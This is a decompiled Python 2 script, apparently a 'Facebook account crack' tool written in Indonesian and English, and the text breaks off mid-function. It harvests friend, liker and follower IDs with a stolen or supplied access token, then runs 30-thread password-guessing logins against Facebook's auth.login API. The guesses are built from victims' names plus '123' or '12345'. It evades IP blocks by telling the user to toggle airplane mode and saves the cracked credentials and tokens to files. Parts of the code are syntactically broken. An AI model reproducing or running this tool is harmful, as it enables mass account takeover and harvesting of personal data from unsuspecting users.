# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-09 12:35:42.993080
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[1;97m'
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
o = '\x1b[1;96m'
n = '\x1b[0m'
try:
    import os, sys, time, random, bs4, requests, mechanize, subprocess, logging, calendar, json, re, datetime
    from concurrent.futures import ThreadPoolExecutor
    from datetime import datetime
    from bs4 import BeautifulSoup
    from datetime import date
    from time import sleep as jeda
    s = requests.Session()
except ImportError:
    print '\n%s[%s!%s] Ada module import yang belum di install !' % (p, o, p)
    os.system('pip2 install bs4')
    print '\n%s[%s\xe2\x88\x9a%s] bs4 sukses di install \xe2\x88\x9a' % (p, h, p)
    os.system('pip2 install requests')
    print '\n%s[%s\xe2\x9c\x93%s] requests sukses di install' % (p, h, p)
    os.system('pip2 install futures')
    print '\n %s[%s\xe2\x88\x9a%s] Module futures sukses di install' % (p, h, p)
    os.system('pip2 install mechanize')
    print '\n%s[%s\xe2\x9c\x93%s] Semua module sukses di install' % (p, h, p)
    print '\n%s[%s!%s] jika masih eror cek koneksi lu' % (p, m, p)
    raw_input('%s[%s MENU %s] ' % (p, h, p))
    menu()

IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        jeda(0.03)


ct = datetime.now()
n = ct.month
bulann = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

def folder():
    try:
        os.mkdir('hasil')
    except:
        pass

    try:
        os.mkdir('data')
    except:
        pass


def logo():
    print '%s\n        ______  _____   ___    ____   ____\n       /_  __/ / ___/  / _ |  / __/  /  _/\n        / /   / /__   / __ | / _/   _/ /\n       /_/    \\___/  /_/ |_|/_/    /___/\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n [%s\xc3\x97%s] Author script  : Khamdihi XD\n [%s\xc3\x97%s] Github new     : https://github.com/khamdihi\n [%s\xc3\x97%s] Status script  : Elit not premium\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 ' % (p, u, p, u, p, u, p)


header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')

def log():
    os.system('clear')
    logo()
    toket = raw_input('%s [%s+%s] Enter token : %s' % (p, h, p, u))
    try:
        x = requests.get('https://graph.facebook.com/me?access_token=%s' % toket).json()['name']
        open('xnxcode.txt', 'w').write(toket)
        print '\n%s [%s\xe2\x88\x9a%s] Login successful wait 3 seconds' % (p, h, p)
        print '%s [%s!%s] Please suscribe my chenel youtube ;(' % (p, h, p)
        bot()
    except KeyError:
        print '%s [%s!%s] Login failed to re-check the malaknya token' % (p, m, p)
        time.sleep(2)
        xnxx = raw_input('%s [%s+%s] Type [%sopen%s] if you don't know how to get tokens : ' % (p, u, p, h, p))
        if xnxx in ('open', 'OPEN', 'Open'):
            print '%s [%s\xe2\x88\x9a%s] You will be redirected to youtube' % (p, h, p)
            os.system('xdg-open https://youtu.be/dpK2yCZmuPA')
            exit()
        else:
            pks = raw_input('%s [%s?%s] Kamu mau keluar/lanjut k/l : ' % (p, k, p))
            if pks in ('l', 'L'):
                log()
            elif pks in ('k', 'K'):
                exit('%s[%s!%s] Goodbye' % (p, h, p))
            else:
                print '%s [%s!%s] type k/l not it%s' % (p, m, p, pks)
                time.sleep(2)
                exit()


def bot():
    try:
        os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
        time.sleep(2)
        toket = open('xnxcode.txt', 'r').read()
    except IOError:
        print '%s[%s!%s] Your token is invalid' % (p, m, p)
        os.system('rm -rf xnxcode.txt')
        exit()

    try:
        xx = requests.get('https://graph.facebook.com/me?access_token=%s' % toket).json()['name']
        print '%s\n\n [%s\xe2\x80\xa2%s] Thank you mamas %s I want to subscribe, handsome  :)' % (p, h, p, xx)
        raw_input('%s [ %sENTER MENU %s %s]' % (p, h, xx, p))
        menu()
    except KeyError:
        print '%s[%s!%s] Your token is invalid ! ' % (p, m, p)
        time.sleep(2)
        log()
    except requests.exceptions.ConnectionError:
        exit('[%s!%s] your connection is bad' % (p, m))


def menu():
    os.system('clear')
    try:
        toket = open('xnxcode.txt', 'r').read()
    except IOError:
        print '%s[%s!%s] Your token is invalid/not logged in' % (p, m, p)
        time.sleep(2)
        os.system('rm -rf xnxcode.txt')
        time.sleep(2)
        log()

    try:
        you = requests.get('https://graph.facebook.com/me?access_token=%s' % toket).json()['name']
    except KeyError:
        print '%s[%s!%s] Your token is invalid' % (p, m, p)
        time.sleep(2)
        os.system('rm -rf xnxcode.txt')
        log()
    except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] Connection error' % (p, m, p))

    logo()
    IP = requests.get('https://api.ipify.org').text
    print '\n [%s+%s] IP >  %s' % (k, p, IP)
    print ' [%s+%s] Welcome > %s' % (k, p, you)
    print ' [%s+%s] Logo Script : Logo Script: Facebook account crack tools' % (k, p)
    print '\n [%s1%s] dump id from frinds and public' % (k, p)
    print ' [%s2%s] dump id from likes' % (k, p)
    print ' [%s3%s] dump id from public post' % (k, p)
    print ' [%s4%s] dump id from total followers' % (k, p)
    print ' [%s5%s] public bulk id dump' % (k, p)
    print ' [%s6] %sclass crack/start crack' % (k, h)
    print ' %s[%s7%s] check crack results' % (p, k, p)
    print ' [%s8%s] user agent settings' % (k, p)
    print ' [%s9%s] report bugs' % (k, p)
    print ' [%sI%s] script info!' % (k, p)
    print ' [%sk%s] %delete xnxcode.txt' % (k, p, m)
    sa = raw_input('\n %s[%s\xe2\x80\xa2%s] choose input : ' % (p, k, p))
    if sa in ('', ' ', ''):
        print '%s [%s!%s] Don't be empty%s konto !' % (p, m, p, you)
        time.sleep(3)
        menu()
    elif sa in ('1', '01', '0 1'):
        publik(toket)
    elif sa in ('2', '02', '0 2'):
        print '\n%s [%s!%s] Next update maze' % (P, H, P)
        time.sleep(2)
        menu()
    elif sa in ('3', '03', '0 3'):
        postingan(toket)
    elif sa in ('4', '04', '0 4'):
        follo(toket)
    elif sa in ('5', '05', '0 5'):
        masal()
    elif sa in ('6', '06', '0 6'):
        khamdihi().ganteng()
    elif sa in ('7', '07', '0 7'):
        hasil()
    elif sa in ('8', '08', '0 8'):
        print '\n%s [%s1%s] Change the user agent right now\n %s[%s2%s] Check the current user-agent\n %s[%s0%s] Back to menu' % (p, h, p, p, h, p, p, h, p)
        it = raw_input('\n%s [%s?%s] Chose ua : ' % (p, k, p))
        if it == '':
            menu()
        elif it in ('1', '01', '0 1'):
            use = raw_input('%s [%s?%s] Enter user-agent : ' % (p, h, p))
            if use in ('', ' ', ''):
                print '%s [%s!%s] don't be empty' % (p, m, p)
                menu()
            else:
                try:
                    zedd = open('ua.txt', 'w')
                    zedd.write(use)
                    zedd.close()
                    print '%s [%s\xe2\x88\x9a%s] Success in changing the new useragent' % (p, h, p)
                    print '%s [%s\xe2\x88\x9a%s] current user agent : %s' % (p, h, p, use)
                    ua2 = raw_input('\n%s [%s enter to return%s]' % (p, h, p))
                    menu()
                except KeyError:
                    time.sleep(2)
                    menu()

        elif it in ('2', '02', '0 2'):
            try:
                ua_ = open('data/ua.txt', 'r').read()
                jeda(2)
                print '%s [%s*%s] your user agent: %s%s' % (P, K, P, H, ua_)
                jeda(2)
                raw_input('\n%s [ %flashlight%s ] ' % (P, K, P))
                menu()
            except IOError:
                ua_ = '%s-' % M

        else:
            menu()
    elif sa in ('9', '09', '0 9'):
        print '\n%s [%s!%s] You will be directed to whatsapp' % (p, h, p)
        os.system('xdg-open https://wa.me/qr/VOPTEUBSWABNH1')
        time.sleep(3)
        exit()
    elif sa in ('i', 'I', ' i', 'ii'):
        print '\n%s [%s!%s] Made by> LADI XD' % (P, H, P)
        print ' %s[%s\xe2\x80\xa2%s] Date created > 3 maret 2022' % (P, H, P)
        print ' %s[%s\xe2\x80\xa2%s] Info script > This is made for free. If someone is selling it, don't want it % (p, m, p)
        print ' %s[%s\xe2\x80\xa2%s] Tools version> 1.2.4' % (p, m, p)
        raw_input(' %s[%s MENU %s] ' % (p, h, p))
        menu()
    elif sa in ('k', 'K', ' K'):
        os.system('rm -rf xnxcode.txt')
        exit()
    else:
        menu()


def postingan(toket, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n%s [%s\xe2\x80\xa2%s] Keep in mind the posts are mandatory public' % (P, K, P)
        idt = raw_input(' [*] Id post   : %s' % H)
        simpan = raw_input(' %s[?] Nama file : %s' % (P, H))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s' % (idt, toket))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] collect id:%s %s ' % (P, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.005)

        bff.close()
        print '\n\n %s[%s\xe2\x88\x9a%s] Success dump id posting' % (P, K, P)
        print '%s [%s\xe2\x88\x9a%s] Saved dump files:%s %s ' % (P, K, P, K, file)
        raw_input('\n%s [ %senter %s] ' % (P, H, P))
        menu()
    except Exception as e:
        print '\n %s[%s!%s] failed dump id' % (P, M, P)
        time.sleep(2)
        menu()


def hasil():
    print '%s\n [%s1%s] check results' % (p, h, p)
    print '%s [%s0%s] return' % (p, h, p)
    c = raw_input('\n%s [%s?%s] choose result : ' % (p, h, p))
    if c in ('', ):
        print '%s [%s!%s] correct content ' % (P, M, P)
        exit()
    elif c in ('1', '01'):
        try:
            dirs = os.listdir('results')
            print ''
            for file in dirs:
                print '%s > %s%s' % (K, P, file)
                jeda(0.2)

            print '\n %s[%s\xe2\x80\xa2%s] cth : CP-%s-%s-%s%s' % (P, M, P, ha, op, ta, '.txt')
            file = raw_input('%s [?] input file : ' % P)
            jeda(0.2)
            if file == '':
                print '%s [!] file does not exist ' % M
            total = open('results/%s' % file).read().splitlines()
            print ' %s[%s\xe2\x80\xa2%s] --------------------------------------' % (P, K, P)
            jeda(2)
            nm_file = ('%s' % file).replace('-', ' ')
            jalan(' [%s\xe2\x80\xa2%s] total account : %s' % (K, P, len(total)))
            print ' %s[%s\xe2\x80\xa2%s] --------------------------------------' % (P, K, P)
            jeda(2)
            for akun in total:
                fb = akun.replace('\n', '')
                tling = fb.replace(' *--> ', ' *-->').replace(' *-->', ' *--> ')
                print tling
                jeda(0.03)

            print ' %s[%s\xe2\x80\xa2%s] --------------------------------------' % (P, K, P)
            jeda(2)
            raw_input('\n%s [ %flashlight %s] ' % (P, K, P))
            menu()
        except IOError:
            print '\n%s [!] no result' % M
            raw_input('\n%s [ %senter %s] ' % (P, K, P))
            menu()

    elif c in ('2', '02', '0 2'):
        menu()
    else:
        menu()


def opsi():
    print '%s [%s!%s] Grandma update mamasz' % (p, h, p)
    time.sleep(2)
    menu()


def publik(toket, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n %s[%s?%s] Type me if you want dump from friends list' % (p, h, p)
        idt = raw_input(' %s[%s?%s] Enter id %s' % (p, k, p, h))
        kontol = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, toket))
        coli = json.loads(kontol.text)
        file = ('dump/' + coli['first_name'] + '.json').replace(' ', '_')
        xnxx = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s' % (idt, toket))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            xnxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m <-> ' + w + '%s%s                                        \r\n\x1b[1;92m [ collect id dump ]' % (a['name'], len(id)))
            sys.stdout.flush()
            sys.stdout.flush()
            time.sleep(0.005)

        xnxx.close()
        print '\n\n %s[%s\xe2\x88\x9a%s] Dump success: %s' % (p, h, p, file)
        print '%s [%s\xe2\x80\xa2%s] Copy out the file above ' % (p, k, p)
        raw_input('\n %s[ %click enter to return to the menu %s]' % (p, h, p))
        menu()
    except Exception as e:
        print '\n %s[%s!%s]private/unpublic target id' % (p, m, p)
        time.sleep(3)
        menu()


def follo(toket, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print "\n%s [%s!%s] Type '%sme%s' if you want to dump your own followers " % (P, K, P, K, P)
        idt = raw_input(' [*] Target id : %s' % H)
        batas = raw_input(' %s[*] Maximum id : %s' % (P, H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, toket))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, batas, toket))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] collect id :%s %s ' % (P, U, str(len(id))),
            sys.stdout.flush()
            jeda(0.005)

        bff.close()
        print '\n\n %s[%s\xe2\x88\x9a%s] Success dump id from %s%s' % (P, K, P, K, nm['name'])
        print ' %s[%s\xe2\x88\x9a%s] Saved dump files :%s %s ' % (P, K, P, K, file)
        raw_input('\n%s [ %senter %s] ' % (P, H, P))
        menu()
    except Exception as e:
        print '\n %s[%s!%s] id not public lol' % (P, M, P)
        time.sleep(2)
        menu()


def masal():
    try:
        lil = open('xnxcode.txt', 'r').read()
    except I0Error:
        exit('%s[\xe2\x80\xa2] Modar token dinggo wae idiot' % p)

    try:
        tr = int(raw_input('\n %s[%s?%s] How many ids do you want to dump? : ' % (p, h, p)))
    except:
        tr = 1

    il = raw_input(' %s[%s\xe2\x80\xa2%s] Create dump files: ' % (p, k, p))
    for zx in range(tr):
        zx += 1
        id = raw_input(' %s[%s?%s] Userid %s%s : ' % (p, k, p, h, zx))
        try:
            rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id, lil))
            ex = json.loads(rex.text)
            file = open(il, 'a')
            id = []
            for a in ex['friends']['data']:
                id.append(a['id'] + '<=>' + a['name'])
                file.write(a['id'] + '<=>' + a['name'] + '\n')
                print '\r%s[!] %s%s %s%s %s%s ' % (p, b, str(len(id)), i, a['name'], o, a['id']),
                sys.stdout.flush()
                jeda(0.005)
                print ''

        except KeyError:
            exit(' %s[!] private/unpublic id!' % m)

    file.close()
    __id = open(il, 'r').readlines()
    print ' %s[\xe2\x80\xa2] Total id of dump%s %s %s' % (p, b, len(__id), p)
    print ' [\xe2\x80\xa2] The dump file is stored in : %s%s' % (B, il)
    time.sleep(5)
    menu()


class khamdihi():

    def __init__(self):
        self.id = []

    def ganteng(self):
        try:
            self.apk = raw_input('\n %s[%s?%s] dump file :%s ' % (P, K, P, H))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s\xe2\x80\xa2%s] number of id : %s%s' % (p, u, p, h, len(self.id))
        except:
            print '\n%s [!] The dump file does not exist, the dump id used to be kentod' % K
            raw_input('\n%s [ %senter %s] ' % (P, m, P))
            menu()

        _dihi_ = raw_input('%s [?] want to use manual password? y/t :%s ' % (P, K))
        if _dihi_ in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) for separator ' % (P, M, P, H, P)
            while True:
                pwx = raw_input(' %s[?] set password :%s ' % (P, K))
                if pwx == '':
                    print '\n %s[!] don't be empty' % M
                elif len(pwx) <= 5:
                    print '\n %s[!] Password minimum 6 characters' % M
                else:

                    def zona(zafi_=None):
                        ind = raw_input('\n %s[?] methode : %s' % (p, u))
                        if ind == '':
                            print '%s [!]Correct content kentod' % M
                            self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s\xe2\x80\xa2%s] akun %sOK%s saved in>%s results/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] akun %sCP %saved in> %results/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] every 500 ID crack use airplane mode 5 seconds\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s\xe2\x80\xa2%s] account %sOK%s saved in>%s results/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] account %sCP %saved in> %results/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] every 500 ID crack use airplane mode 5 seconds\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s\xe2\x80\xa2%s] account %sOK%s saved in>%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] account %sCP %saved in> %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] every 500 ID crack use airplane mode 5 seconds\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        else:
                            print '\n %s[!] correct content kentod' % M
                            zona()

                    print '\n%s [ choose the crack method - please try one by one ]\n' % P
                    print ' [%s1%s] methode b-api ' % (K, P)
                    print ' [%s2%s] methode mbasic ' % (K, P)
                    print ' [%s3%s] methode mobile  ' % (K, P)
                    zona(pwx.split(','))
                    break

        elif _dihi_ in ('T', 't'):
            print '\n%s [ choose the crack method - please try one by one]\n' % P
            print ' [%s1%s] methode b-api ' % (u, P)
            print ' [%s2%s] methode mbasic ' % (u, P)
            print ' [%s3%s] methode Free Faceboook [OK] \xe2\x88\x9a ' % (u, P)
            print ' [%s4%s] Methode b-api_versi2 [OK]   \xe2\x88\x9a' % (u, p)
            print ' [%s5%s] Methode Touch Facebook.com > I haven't tried ! ' % (u, p)
            self.langsung()
        else:
            print '%s [!] Correct content kentod % M
            jeda(2)
            menu()
        return

    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s ' % (p, h))
        if suuu == '':
            print '%s [!] Correct content kentod ' % M
            self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s\xe2\x80\xa2%s] account %sOK%s saved in>%s results/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] account %sCP %saved in> %results/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] every 500 ID crack use airplane mode 5 seconds\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s\xe2\x80\xa2%s] account %sOK%s saved>%s results/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] account %sCP %saved> %results/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] every 500 ID crack use airplane mode 5 seconds\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, u, p, u, P, u, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, u, P, u, P, u, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, h, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('4', '04'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s!%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('5', '05'):
            print '\n %s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s\xe2\x80\xa2%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, K, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.xnxx, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        else:
            print '%s [%s!%s] isi yang bener kntod' % (p, m, p)
            menu()

    def b_api(self, user, zona):
        global cp
        global loop
        global ok
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {'user-agent': ua, 'x-fb-connection-bandwidth': str(random.randint(20000, 40000)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            bapi = 'https://b-api.facebook.com/method/auth.login'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
                loop += 1
                print '\r\x1b[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik',
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s ' % (H, user, pw, response.json()['access_token'])
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, response.json()['access_token']))
